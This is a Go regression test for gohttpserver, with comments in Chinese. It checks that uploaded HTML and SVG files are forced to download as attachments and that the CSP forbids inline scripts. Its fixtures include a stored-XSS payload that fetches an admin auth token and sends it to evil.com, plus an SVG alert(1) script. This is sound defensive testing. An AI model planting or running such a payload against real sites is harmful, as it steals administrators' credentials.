package server

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/codeskyblue/gohttpserver/internal/util"
)

func securityHeadersForTest(h http.Handler) http.Handler {
	return util.SecurityHeaders(ContentSecurityPolicy)(h)
}

// H2 后半部分回归：上传的 HTML/SVG 必须以 attachment 下发，防止同源渲染执行脚本。
func TestUploadedHTMLForcesAttachment(t *testing.T) {
	root := t.TempDir()
	payload := []byte(`<!DOCTYPE html><html><body><script>fetch('/-/api/admin/frp/auth-token').then(r=>r.text()).then(t=>new Image().src='//evil.com?'+t)</script></body></html>`)
	os.WriteFile(filepath.Join(root, "evil.html"), payload, 0o644)
	os.WriteFile(filepath.Join(root, "xss.svg"), []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`), 0o644)
	os.WriteFile(filepath.Join(root, "normal.txt"), []byte("hello"), 0o644)

	s := NewHTTPStaticServer(root, true)
	wrapped := securityHeadersForTest(s)

	// HTML：必须 attachment
	req := httptest.NewRequest("GET", "/evil.html", nil)
	rec := httptest.NewRecorder()
	wrapped.ServeHTTP(rec, req)
	cd := rec.Header().Get("Content-Disposition")
	if !strings.Contains(cd, "attachment") {
		t.Errorf("evil.html Content-Disposition = %q, want attachment", cd)
	}

	// SVG：必须 attachment
	req = httptest.NewRequest("GET", "/xss.svg", nil)
	rec = httptest.NewRecorder()
	wrapped.ServeHTTP(rec, req)
	if cd = rec.Header().Get("Content-Disposition"); !strings.Contains(cd, "attachment") {
		t.Errorf("xss.svg Content-Disposition = %q, want attachment", cd)
	}

	// 普通 txt：不应强制 attachment
	req = httptest.NewRequest("GET", "/normal.txt", nil)
	rec = httptest.NewRecorder()
	wrapped.ServeHTTP(rec, req)
	if cd = rec.Header().Get("Content-Disposition"); strings.Contains(cd, "attachment") {
		t.Errorf("normal.txt unexpectedly forced to attachment: %q", cd)
	}

	// HTML 的 script 内容不能被同源渲染（attachment 已保证，这里再断言 CSP 无 unsafe-inline）
	if strings.Contains(rec.Header().Get("Content-Security-Policy"), "script-src 'self' 'unsafe-inline'") {
		t.Error("CSP still allows unsafe-inline scripts")
	}
}
